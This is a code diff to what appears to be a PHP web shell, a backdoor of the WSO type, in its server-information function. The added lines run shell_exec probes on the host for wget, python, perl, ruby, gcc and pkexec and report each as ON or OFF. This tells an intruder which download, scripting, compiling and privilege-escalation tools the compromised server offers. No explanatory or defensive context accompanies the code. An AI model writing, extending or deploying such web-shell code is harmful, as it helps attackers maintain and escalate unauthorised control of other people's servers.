@@ -401,11 +401,19 @@ function actionSecInfo() {
 	showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
     if(function_exists('apache_get_modules'))
         showSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
-	showSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
+	showSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'NONE');
 	showSecParam('Open base dir', @ini_get('open_basedir'));
 	showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
-	showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
-	showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
+	showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));;
+	$curl = (function_exists("curl_version")) ? "<font color='#FFDB5F'>ON</font>" : "<font color='red'>OFF</font>";
+	$wget = (@shell_exec("wget --help")) ? "<font color='#FFDB5F'>ON</font>" : "<font color='red'>OFF</font>";
+	$python = (@shell_exec("python --help")) ? "<font color='#FFDB5F'>ON</font>" : "<font color='red'>OFF</font>";
+	$perl = (@shell_exec("perl --help")) ? "<font color='#FFDB5F'>ON</font>" : "<font color='red'>OFF</font>";
+	$ruby = (@shell_exec("ruby --help")) ? "<font color='#FFDB5F'>ON</font>" : "<font color='red'>OFF</font>";
+	$gcc = (@shell_exec("gcc --help")) ? "<font color='#FFDB5F'>ON</font>" : "<font color='red'>OFF</font>";
+	$pkexec = (@shell_exec("pkexec --version")) ? "<font color='#FFDB5F'>ON</font>" : "<font color='red'>OFF</font>";
+	echo "CURL: $curl, WGET: $wget, PERL: $perl, RUBY: $ruby, PYTHON: $python, GCC: $gcc, PKEXEC: $pkexec";
+	echo '<br>';
 	$temp=array();
 	if(function_exists('mysqli_get_client_info'))
 		$temp[] = "MySql (".mysqli_get_client_info().")";
